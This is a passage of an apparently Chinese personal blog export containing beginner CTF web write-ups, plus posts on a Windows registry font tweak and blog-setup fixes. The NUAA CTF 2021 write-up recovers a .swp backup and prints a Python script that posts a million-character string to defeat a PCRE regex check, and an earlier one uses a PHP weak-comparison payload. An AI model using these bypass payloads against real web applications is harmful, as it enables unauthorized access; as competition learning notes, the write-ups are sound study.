<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$what</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;what&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$what</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$what</span>==<span class="string">&#x27;flag&#x27;</span>)</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;flag&#123;****&#125;&#x27;</span>;</span><br></pre></td></tr></table></figure>
<p>审计，是要通过get的方式提交一个变量<code>what=flag</code>，<br>在地址栏输入<code>http://114.67.246.176:16477/?what=flag</code>即可得到flag</p>
<h2 id="web4-1"><a href="#web4-1" class="headerlink" title="web4"></a>web4</h2><p>打开场景又是一段PHP代码，</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$what</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;what&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$what</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$what</span>==<span class="string">&#x27;flag&#x27;</span>)</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;flag&#123;****&#125;&#x27;</span>;</span><br></pre></td></tr></table></figure>
<p>审计，是要通过post的方式提交一个变量<code>what=flag</code>,通过hackbar post一下即可</p>
<h2 id="web5-1"><a href="#web5-1" class="headerlink" title="web5"></a>web5</h2><p>打开场景又是一段PHP代码，</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$num</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(!is_numeric(<span class="variable">$num</span>))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$num</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$num</span>==<span class="number">1</span>)</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;flag&#123;**********&#125;&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>审计，是弱类型比较，要求num变量既不是数字又满足等于1的条件，所以在1后面加一个字母即可<br>通过get方式提交<code>http://114.67.246.176:12222/?num=1a</code><br>得到flag</p>
<h2 id="web6-1"><a href="#web6-1" class="headerlink" title="web6"></a>web6</h2><p>打开场景一堆弹窗，关都关不完，查看网页源码，<br><img src="https://z3.ax1x.com/2021/04/13/cyMAh9.png"><br>…发现写了一堆alert…绝了<br>在最下面发现了注释掉的编码，<br><img src="https://z3.ax1x.com/2021/04/13/cyMunK.png"><br>查了一下是Unicode编码，通过工具Unicode转ASCII得到flag</p>
<h2 id="web7-1"><a href="#web7-1" class="headerlink" title="web7"></a>web7</h2><p>弹窗提示停止网页刷新可得到flag<br>查看网页源代码，发现<br><img src="https://z3.ax1x.com/2021/04/20/cH8KiT.jpg"><br>并且前面的图片命名为num.jpg，于是尝试刷新，发现图片num确实随着刷新改变，然后不断刷新，最后在一次刷新后圈圈的地方出现flag</p>
<h2 id="web8-1"><a href="#web8-1" class="headerlink" title="web8"></a>web8</h2><blockquote>
<p>PHP暂略</p>
</blockquote>
<h2 id="web9"><a href="#web9" class="headerlink" title="web9"></a>web9</h2><blockquote>
<p>PHP暂略</p>
</blockquote>
<h2 id="web-10"><a href="#web-10" class="headerlink" title="web 10"></a>web 10</h2><p>打开页面显示什么也没有？信个鬼<br>根据描述头等舱，联想到消息头，BP抓包，在消息头中得到flag</p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>NUAA CTF 2021 Web Write up</title>
    <url>/2021/04/10/NUAA%20CTF%202021%20WP/</url>
    <content><![CDATA[<h1 id="NUAA-CTF-2021-Web-Write-up"><a href="#NUAA-CTF-2021-Web-Write-up" class="headerlink" title="NUAA CTF 2021 Web Write up"></a>NUAA CTF 2021 Web Write up</h1><p>第一场正式的的CTF比赛WP</p>
<span id="more"></span>

<h2 id="签到题"><a href="#签到题" class="headerlink" title="签到题"></a>签到题</h2><p>打开环境，查看网页源代码，即发现flag<br><img src="https://img-blog.csdnimg.cn/20210328195900666.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_SGFpcnNoZWVw,size_20,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<h2 id="DDoSme"><a href="#DDoSme" class="headerlink" title="DDoSme"></a>DDoSme</h2><p>打开环境，提示Do you kNow .swp file? 直接百度，查到<br><img src="https://img-blog.csdnimg.cn/20210328204502583.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_SGFpcnNoZWVw,size_64,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<p>于是知道会要用到Linux<br>用dirsearch扫一下网站目录，发现了.index.php.swp文件</p>
<p><img src="https://img-blog.csdnimg.cn/20210328204551203.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_SGFpcnNoZWVw,size_64,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<p>地址栏URL后面输入<code>.index.php.swp</code>下载swp文件<br>这个时候用notepad打开发现全是乱码，百度发现<br><img src="https://img-blog.csdnimg.cn/20210328200950634.png"></p>
<p>于是复制到Linux虚拟机中，</p>
<p><img src="https://img-blog.csdnimg.cn/20210328204652570.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_SGFpcnNoZWVw,size_64,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<p>再<br><img src="https://img-blog.csdnimg.cn/20210328201104698.png" alt="在这里插入图片描述"></p>
<p>得到还原后的PHP文件</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">areyouok</span>(<span class="params"><span class="variable">$greeting</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> preg_match(<span class="string">&#x27;/Baby.*PHP/is&#x27;</span>,<span class="variable">$greeting</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$greeting</span>=@<span class="variable">$_POST</span>[<span class="string">&#x27;greeting&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(!is_array(<span class="variable">$greeting</span>))&#123;</span><br><span class="line">    <span class="keyword">if</span>(!areyouok(<span class="variable">$greeting</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(strpos(<span class="variable">$greeting</span>,<span class="string">&#x27;Baby PHP&#x27;</span>)!==<span class="literal">false</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;flag&#123;xxxxxx&#125;&#x27;</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;Do you kNow .swp file?&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;Do you know PHP?&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>emmm…PHP学的还不多，看不懂，果断度娘，发现……竟然跟18年i春秋圣诞欢乐赛题一样…原理就是pcre具有回溯上限，当回溯超过上限时返回 false，从而绕过正则匹配函数(虽然俺不懂，但俺会CV大法)<br>链接:<a href="https://www.jianshu.com/p/68f3c8e5d2b4">2018年i春秋圣诞欢乐赛Web WP</a><br>然后通过Python写个脚本：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> io <span class="keyword">import</span> BytesIO</span><br><span class="line"></span><br><span class="line">files = &#123;</span><br><span class="line">  <span class="string">&#x27;greeting&#x27;</span>:(<span class="string">&#x27;Baby PHP&#x27;</span> + <span class="string">&#x27;a&#x27;</span> * <span class="number">1000000</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">res = requests.post(<span class="string">&#x27;http://server.cooook.icu:10003/index.php&#x27;</span>, data=files, allow_redirects=<span class="literal">False</span>)</span><br><span class="line">print(res.text)</span><br></pre></td></tr></table></figure>
<p>运行之后，成功拿到flag</p>
<p><img src="https://img-blog.csdnimg.cn/20210328204722851.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_SGFpcnNoZWVw,size_32,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<h2 id="easy-xss"><a href="#easy-xss" class="headerlink" title="easy_xss"></a>easy_xss</h2><p>看题目知道是xss跨站脚本漏洞攻击<br>题目要求是：<br><img src="https://img-blog.csdnimg.cn/20210328201752270.png" alt="在这里插入图片描述"><br>扫了下网站<br><img src="https://img-blog.csdnimg.cn/20210328201935905.png" alt="在这里插入图片描述"><br>看到了upload.php，试了一下emmm确实打不开<br>所以要登入管理员界面，xss攻击，想到了窃取cookie绕过登录，<br>而且正好点开Read sample post出现了管理员发表的文章</p>
<p>然后..就卡住了(っ °Д °)っ<br><img src="https://img-blog.csdnimg.cn/20210328204809754.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_SGFpcnNoZWVw,size_64,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<h2 id="base64"><a href="#base64" class="headerlink" title="base64"></a>base64</h2><p><img src="https://img-blog.csdnimg.cn/2021032821021262.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_SGFpcnNoZWVw,size_32,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20210328210244539.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_SGFpcnNoZWVw,size_48,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>emmm……PHP，Base64，这俩合一起….看了度娘都看不懂…毫无思路</p>
<p>比完赛，感觉 我是废物（；´д｀）ゞ</p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>注册表大法</title>
    <url>/2021/04/06/%E6%B3%A8%E5%86%8C%E8%A1%A8%E5%A4%A7%E6%B3%95/</url>
    <content><![CDATA[<p>注册表大法DIY电脑永远滴神</p>
<span id="more"></span>
<h1 id="CMD窗口修改字体"><a href="#CMD窗口修改字体" class="headerlink" title="CMD窗口修改字体"></a>CMD窗口修改字体</h1><blockquote>
<p>CMD默认字体颜值无力吐槽，甚至还有1和l、0和o分不清的问题，于是打算修改一下，添加consolas字体</p>
</blockquote>
<h2 id="打开注册表编辑器"><a href="#打开注册表编辑器" class="headerlink" title="打开注册表编辑器"></a>打开注册表编辑器</h2><p>首先<code>win+r</code>,<code>regedit</code>打开</p>
<h2 id="找到修改路径"><a href="#找到修改路径" class="headerlink" title="找到修改路径"></a>找到修改路径</h2><p>打开路径<code>计算机\HKEY_CURRENT_USER\Console</code><br>再打开<code>%SystemRoot%_system32_cmd.exe</code>项<br>将<code>CodePage</code>键值十进制修改为<code>437</code><br><del>&gt; 同理，修改Dev-C++窗口的字体，只需打开<code>D:_Dev-Cpp_ConsolePauser.exe</code>项，修改键值即可</del><br>不要这么改！o(￣┰￣*)ゞ<br>导致了我不知道为什么编译不了程序，于是重做了一遍系统…</p>
]]></content>
      <categories>
        <category>DIY</category>
      </categories>
      <tags>
        <tag>DIY</tag>
      </tags>
  </entry>
  <entry>
    <title>问题簿</title>
    <url>/2021/04/05/%E9%97%AE%E9%A2%98%E7%B0%BF/</url>
    <content><![CDATA[<p>记录遇到的一些有参考性的问题</p>
<span id="more"></span>
<h1 id="2021"><a href="#2021" class="headerlink" title="2021"></a>2021</h1><h2 id="01-03"><a href="#01-03" class="headerlink" title="01~03"></a>01~03</h2><ol>
<li>搭建博客过程中更换next主题上传出现大量报错: <blockquote>
<p>检查发现是因为next的github地址更换，导致git命令执行失败<br>更换后的URL: <a href="https://github.com/theme-next/hexo-theme-next">https://github.com/theme-next/hexo-theme-next</a></p>
</blockquote>
</li>
<li>kali配置静态IP后无法重启网络服务: <blockquote>
<p>翻了大量的帖子后解决了问题<br><code>root@test:~# ip addr flush dev eth0 &amp;&amp; /etc/init.d/networking restart</code><br>执行此指令后，网络服务重启成功<br>原帖: <a href="https://blog.csdn.net/w294954902/article/details/82628909">https://blog.csdn.net/w294954902/article/details/82628909</a></p>
</blockquote>
</li>
</ol>
<h2 id="04"><a href="#04" class="headerlink" title="04"></a>04</h2><ol>
<li>重新搭建博客过程中上传文件出现大量报错: <blockquote>
<p>发现原来是因为更改了站点配置文件中的timezone<br>orz 就因为我没事闲的把时区改成了Asia/Beijing<br>经改为Asia/Shanghai后上传，已恢复正常</p>
</blockquote>
</li>
<li>创建新文章时上传文件卡住，显示ssh密钥连接不上，又ping了一下github，发现连接不上: <blockquote>
<p>找了一下原因…原来是因为前一阵github被墙了，我就在host文件里添加了github的解析，在测试此方法无效后未删除…<br>删了那些解析后成功连接github，并且博客也可正常登录</p>
</blockquote>
</li>
<li>为博客添加访问量统计功能出现错误:<blockquote>
<p>统计功能采用的是不蒜子，搜了一下发现，原来是因为不蒜子官网的域名过期了，所以URL错误…<br>将<code>themes\next\layout\_partials</code>中<code>footer.swig</code>文件添加的</p>
<figure class="highlight django"><table><tr><td class="code"><pre><span class="line"><span class="template-tag">&#123;% <span class="name"><span class="name">if</span></span> theme.footer.counter %&#125;</span></span><br><span class="line"><span class="xml">   <span class="tag">&lt;<span class="name">script</span> <span class="attr">async</span> <span class="attr">src</span>=<span class="string">&quot;//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="template-tag">&#123;% <span class="name"><span class="name">endif</span></span> %&#125;</span></span><br></pre></td></tr></table></figure>
<p>改为</p>
<figure class="highlight django"><table><tr><td class="code"><pre><span class="line"><span class="template-tag">&#123;% <span class="name"><span class="name">if</span></span> theme.footer.counter %&#125;</span></span><br><span class="line"><span class="xml">   <span class="tag">&lt;<span class="name">script</span> <span class="attr">async</span> <span class="attr">src</span>=<span class="string">&quot;//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="template-tag">&#123;% <span class="name"><span class="name">endif</span></span> %&#125;</span></span><br></pre></td></tr></table></figure>
<p>官方通知: <a href="http://ibruce.info/2015/04/04/busuanzi/">http://ibruce.info/2015/04/04/busuanzi/</a></p>
</blockquote>
</li>
</ol>
<h2 id="05"><a href="#05" class="headerlink" title="05"></a>05</h2><ol>
<li>电脑重做了系统之后，之前用的dirsearch突然用不了了，各种报错，例如<br><img src="https://z3.ax1x.com/2021/05/18/ghYPII.jpg"><br>和这样<br><img src="https://z3.ax1x.com/2021/05/18/ghYCdA.jpg"><br>因为扫不了网站目录，导致我好一段时间冷落了靶场(才不是因为懒(/▽＼)<br>后来问了道长，道长说是Python库丢失了，于是Baiduing···<blockquote>
<p><strong>第一种问题:</strong><br>丢失了type库</p>
<figure class="highlight haskell"><table><tr><td class="code"><pre><span class="line"><span class="title">try</span>:</span><br><span class="line">   <span class="keyword">import</span> requests</span><br><span class="line">	except <span class="type">ImportError</span>:</span><br><span class="line">   <span class="keyword">import</span> os</span><br><span class="line">   os.system(&#x27;pip install <span class="class"><span class="keyword">type</span>&#x27;)</span></span><br><span class="line">   <span class="keyword">import</span> requests</span><br></pre></td></tr></table></figure>
<p>补充type库</p>
<p><a href="https://blog.csdn.net/sinat_38682860/article/details/102798114">原文链接</a></p>
<p><strong>第二种问题:</strong><br>丢失cryptography模块<br>在cmd中输入<code>pip install cryptography</code>即可</p>
<p><a href="https://blog.csdn.net/weixin_43978056/article/details/105940157">原文链接</a></p>
</blockquote>
</li>
</ol>
]]></content>
      <categories>
        <category>杂</category>
      </categories>
      <tags>
        <tag>杂</tag>
      </tags>
  </entry>
  <entry>
    <title>Kali学习记录</title>
    <url>/2021/04/03/Kali%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/</url>
    <content><![CDATA[<h1 id="Kali"><a href="#Kali" class="headerlink" title="Kali"></a>Kali</h1><p>犯罪记录(x)</p>
<span id="more"></span>
<blockquote>
<p>Kali学的好，牢饭吃到饱<br>这里是Kali学习记录<del>(犯罪日记)</del></p>
</blockquote>
]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>CTF 渗透测试</tag>
      </tags>
  </entry>
  <entry>
    <title>0x 00</title>
    <url>/2021/04/02/0x00/</url>
    <content><![CDATA[<h1 id="JUST-A-TEST"><a href="#JUST-A-TEST" class="headerlink" title="JUST A TEST!"></a>JUST A TEST!</h1>]]></content>
  </entry>
</search>
